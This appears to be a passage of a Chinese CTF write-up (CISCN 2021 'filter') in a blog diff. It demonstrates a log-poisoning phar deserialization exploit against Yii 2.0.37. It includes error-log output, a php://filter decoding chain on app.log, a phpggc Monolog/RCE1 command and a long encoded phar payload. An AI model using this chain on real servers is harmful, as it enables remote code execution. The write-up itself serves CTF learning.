3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00D%3D00G%3D00x%3D00J%3D00s%3D00N%3D008%3D00T%3D00m%3D00i%3D00e%3D00m%3D00D%3D009%3D00t%3D00b%3D00O%3D00M%3D00J%3D00u%3D006%3D001%3D00%2F%3D00m%3D004%3D00%2B%3D00U%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D</span><br></pre></td></tr></table></figure>
+<p>现在的日志为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">2021-08-06 15:43:45 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(xxxxxxxxxxxxxxx): failed to open stream: No such file or directory in E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php:65</span><br><span class="line">Stack trace:</span><br><span class="line">#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\phpstudy\\PHP...&#39;, 65, Array)</span><br><span class="line">#1 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx&#39;)</span><br><span class="line">#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()</span><br><span class="line">#3 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\InlineAction.php(57): call_user_func_array(Array, Array)</span><br><span class="line">#4 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)</span><br><span class="line">#5 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Module.php(534): yii\base\Controller-&gt;runAction(&#39;index&#39;, Array)</span><br><span class="line">#6 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\web\Application.php(104): yii\base\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)</span><br><span class="line">#7 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))</span><br><span class="line">#8 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\web\index.php(12): yii\base\Application-&gt;run()</span><br><span class="line">#9 &#123;main&#125;</span><br><span class="line">2021-08-06 15:44:02 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(xxxxxxxxxxxxxxx&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00 &#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00v&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00Y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00d&#x3D;002&#x3D;00h&#x3D;00v&#x3D;00Y&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00G&#x3D;00x&#x3D;00J&#x3D;00s&#x3D;00N&#x3D;008&#x3D;00T&#x3D;00m&#x3D;00i&#x3D;00e&#x3D;00m&#x3D;00D&#x3D;009&#x3D;00t&#x3D;00b&#x3D;00O&#x3D;00M&#x3D;00J&#x3D;00u&#x3D;006&#x3D;001&#x3D;00&#x2F;&#x3D;00m&#x3D;004&#x3D;00 &#x3D;00U&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;3D): failed to open stream: Invalid argument in E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php:65</span><br><span class="line">Stack trace:</span><br><span class="line">#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\phpstudy\\PHP...&#39;, 65, Array)</span><br><span class="line">#1 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx...&#39;)</span><br><span class="line">#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()</span><br><span class="line">#3 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\InlineAction.php(57): call_user_func_array(Array, Array)</span><br><span class="line">#4 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)</span><br><span class="line">#5 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Module.php(534): yii\base\Controller-&gt;runAction(&#39;index&#39;, Array)</span><br><span class="line">#6 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\web\Application.php(104): yii\base\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)</span><br><span class="line">#7 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))</span><br><span class="line">#8 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\web\index.php(12): yii\base\Application-&gt;run()</span><br><span class="line">#9 &#123;main&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>经过验证，刚好符合偶数的两个条件，进行编码解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure>
+<p>看结果，如果结果为空，那是payload前面的字节数成单数了，给payload前后各加一个字符可以解决，如果第一次成功就不用加了，如果失败，也是重新再来一次而已</p>
+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_23-50-10.png"></p>
+<p>可以看到，我们已经构造出phar文件了，接下来就找链子，打了</p>
+<p><strong>解题</strong></p>
+<p>根据上面步骤</p>
+<p>链子用这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phpggc Monolog&#x2F;RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;payload</span><br></pre></td></tr></table></figure>
+<p>将phar处理一下(<code>php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode/resource=payload</code>)</p>
+<p>得到 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00r&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00U&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00M&#x3D;00S&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;001&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;002&#x3D;00Z&#x3D;00W&#x3D;00w&#x3D;00i&#x3D;00O&#x3D;000&#x3D;004&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00N&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00W&#x3D;005&#x3D;00p&#x3D;00d&#x3D;00G&#x3D;00l&#x3D;00h&#x3D;00b&#x3D;00G&#x3D;00l&#x3D;006&#x3D;00Z&#x3D;00W&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00I&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00M&#x3D;00a&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00t&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;00z&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00w&#x3D;00c&#x3D;00m&#x3D;009&#x3D;00j&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;00z&#x3D;00b&#x3D;003&#x3D;00J&#x3D;00z&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00h&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;006&#x3D;00e&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00D&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00N&#x3D;001&#x3D;00c&#x3D;00n&#x3D;00J&#x3D;00l&#x3D;00b&#x3D;00n&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00n&#x3D;00B&#x3D;00o&#x3D;00c&#x3D;00G&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;008&#x3D;00i&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00f&#x3D;00Q&#x3D;00U&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00k&#x3D;00d&#x3D;00W&#x3D;001&#x3D;00t&#x3D;00e&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00L&#x3D;00n&#x3D;00R&#x3D;004&#x3D;00d&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00H&#x3D;00R&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00R&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00N&#x3D;00S&#x3D;00Q&#x3D;00g&#x3D;00s&#x3D;00A&#x3D;002&#x3D;00D&#x3D;00L&#x3D;00z&#x3D;001&#x3D;00J&#x3D;00O&#x3D;00Z&#x3D;00G&#x3D;00X&#x3D;00F&#x3D;00D&#x3D;00D&#x3D;009&#x3D;00+&#x3D;00D&#x3D;00r&#x3D;00m&#x3D;00V&#x3D;00e&#x3D;00g&#x3D;00C&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00R&#x3D;000&#x3D;00J&#x3D;00N&#x3D;00Q&#x3D;00g&#x3D;00&#x3D;3D&#x3D;00&#x3D;3D</span><br></pre></td></tr></table></figure>
+<p>按照上面步骤，最终实现phar反序列化</p>
+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-04-09.png"></p>
+<p>换payload，得到根目录结构</p>
